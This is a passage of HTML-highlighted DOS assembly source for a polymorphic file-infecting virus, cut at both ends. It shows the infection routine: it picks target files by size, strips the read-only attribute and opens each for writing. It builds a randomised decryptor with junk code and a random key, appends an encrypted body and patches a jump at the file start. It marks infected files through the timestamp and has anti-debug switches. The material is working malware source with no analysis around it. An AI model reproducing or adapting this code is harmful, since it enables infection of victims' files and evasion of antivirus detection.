                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01fh</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">next_file</span><span class="sc0">
</span><span class="sc9">IFNDEF</span><span class="sc0"> </span><span class="sc5">stopdebug</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">my_dta</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)+</span><span class="sc2">01ah</span><span class="sc4">],</span><span class="sc2">0fa00h</span><span class="sc0">
                        </span><span class="sc1">; file length compared; need 1.5 k spare, see rnd off</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">my_dta</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)+</span><span class="sc2">01ah</span><span class="sc4">],</span><span class="sc2">0f800h</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">next_file</span><span class="sc0">                 </span><span class="sc1">;    with virus length</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">my_dta</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)+</span><span class="sc2">01ah</span><span class="sc4">],</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc1">; file to short</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">next_file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">file_start_ptr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">my_dta</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">+</span><span class="sc2">01eh</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">move_name</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">move_name</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04300h</span><span class="sc0">
                </span><span class="sc5">regofs</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_name</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">file_attr</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04301h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0fffeh</span><span class="sc0">
                </span><span class="sc5">regofs</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_name</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03d02h</span><span class="sc0">
                </span><span class="sc5">regofs</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_name</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0">
                </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">cont9</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit3</span><span class="sc0">
                </span><span class="sc5">nobug2</span><span class="sc0">
</span><span class="sc5">cont9</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">05700h</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">file_crea</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">file_crea</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">cont10</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc5">regofs</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">old_code</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 1</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">cont98</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">cont98</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04202h</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">;1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0">
                </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">cont99</span><span class="sc0">
</span><span class="sc5">cont98</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit4</span><span class="sc0">
</span><span class="sc5">cont99</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 2</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc1">; save file handle</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">
                </span><span class="sc5">setdat</span><span class="sc0">  </span><span class="sc5">jump_code</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_begin</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">entry</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_begin</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">movcmd</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0"> </span><span class="sc2">02ch</span><span class="sc0">  </span><span class="sc1">; seed the random number generator</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">rand_seed</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 3</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">rand_seed</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 3</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">max_msk</span><span class="sc0"> </span><span class="sc1">; add a random offset to actual length</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 3</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">data_end</span><span class="sc4">-</span><span class="sc5">entry2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; set decode length</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 3</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">dat2</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; save the decode length</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 3</span><span class="sc0">
                </span><span class="sc5">setdat</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">t13</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">),</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; set decode length in 'mov cx,xxxx'</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">; restore the code length of file to be infected</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 3</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">entry2</span><span class="sc4">-</span><span class="sc5">entry</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; add the length</span><span class="sc0">
                              </span><span class="sc1">; of uncoded area plus file offset</span><span class="sc0">
                </span><span class="sc5">setdat</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">t11</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">),</span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">;  set decode begin in 'mov di,xxxx'</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">  </span><span class="sc1">; 3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">rand_seed</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">  </span><span class="sc1">; 3</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">dat1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; save this random key in dat1</span><span class="sc0">
                </span><span class="sc5">setdat</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">t12</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">),</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; set random key in 'mov ax,xxxx'</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">  </span><span class="sc1">; 3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">  </span><span class="sc1">; 3</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">data_begin</span><span class="sc4">-</span><span class="sc5">entry</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">  </span><span class="sc1">; 3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">l11</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; table L11 address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dat3</span><span class="sc4">],</span><span class="sc2">000000111b</span><span class="sc0"> </span><span class="sc1">; required routines</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen2</span><span class="sc0"> </span><span class="sc1">; generate first part of decrypt</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0">  </span><span class="sc5">ptr1</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">  </span><span class="sc1">; save the current counter to resolve 'loop'</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">l21</span><span class="sc4">-</span><span class="sc5">l11</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; add then next tables' offset</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">  </span><span class="sc1">; 3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dat3</span><span class="sc4">],</span><span class="sc2">010000011b</span><span class="sc0"> </span><span class="sc1">; required plus 'nop'</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">  </span><span class="sc1">; 3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen2</span><span class="sc0"> </span><span class="sc1">; generate second part of decrypt</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">l31</span><span class="sc4">-</span><span class="sc5">l21</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; add the next offset</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen2</span><span class="sc0"> </span><span class="sc1">; generate third part of decrypt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; store the loop code</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">ptr2</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 3</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">t40</span><span class="sc4">-</span><span class="sc5">t10</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; point to the code</span><span class="sc0">
                </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">; move the code</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ptr1</span><span class="sc0"> </span><span class="sc1">; the loop address pointer</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">; the current address</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">; point to the jump address</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">   </span><span class="sc1">; resolve the jump</span><span class="sc0">
</span><span class="sc1">; fill in the remaining code</span><span class="sc0">
</span><span class="sc5">l991</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ptr2</span><span class="sc0"> </span><span class="sc1">; get the data_begin pointer</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">data_begin</span><span class="sc4">-</span><span class="sc5">entry2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; locate last+1 entry</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">; are we there yet?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">l992</span><span class="sc0"> </span><span class="sc1">; if not then fill some more space</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0"> </span><span class="sc1">; any code is ok</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gencode</span><span class="sc0"> </span><span class="sc1">; generate the code</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l991</span><span class="sc0">
                </span><span class="sc5">nobug2</span><span class="sc0">
</span><span class="sc5">l992</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">ptr2</span><span class="sc0"> </span><span class="sc1">; restore si to point to data area ;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0">  </span><span class="sc1">; 4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end1</span><span class="sc4">-</span><span class="sc5">begin1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;   move code</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">begin1</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 4</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">data_end</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">+</span><span class="sc5">max_msk</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; add max_msk</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">; set subroutine start</span><span class="sc0">
                </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">  </span><span class="sc1">; move the code</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc1">; restore handle</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setrtn</span><span class="sc0"> </span><span class="sc1">; find this address</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0"> </span><span class="sc1">; &lt;- the number necessary for proper return</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; continue with mask &amp; write code</span><span class="sc0">
</span><span class="sc1">; continue here after return from mask &amp; write code</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 4</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">exit4</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">data_end</span><span class="sc4">-</span><span class="sc5">entry</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 4</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">exit4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04200h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">exit4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc5">NOBUG1</span><span class="sc0"> </span><span class="sc1">; 4</span><span class="sc0">
                </span><span class="sc5">regofs</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">jump_code</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0">
</span><span class="sc5">exit4</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_crea</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_crea</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffe0h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">05701h</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0"> </span><span class="sc2">03Eh</span><span class="sc0"> </span><span class="sc1">; close file</span><span class="sc0">
</span><span class="sc5">exit3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04301h</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_attr</span><span class="sc0">
                </span><span class="sc5">regofs</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_name</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0">
</span><span class="sc5">exit2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">dta_ptr</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">dta_ptr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0"> </span><span class="sc2">01ah</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc1">; deallocate locals</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">stopdebug</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">bugoff</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; common subroutines</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">random</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">rand_seed</span><span class="sc0">    </span><span class="sc1">; get the seed</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">813Ch</span><span class="sc0">        </span><span class="sc1">; xor random pattern</span><span class="sc0">
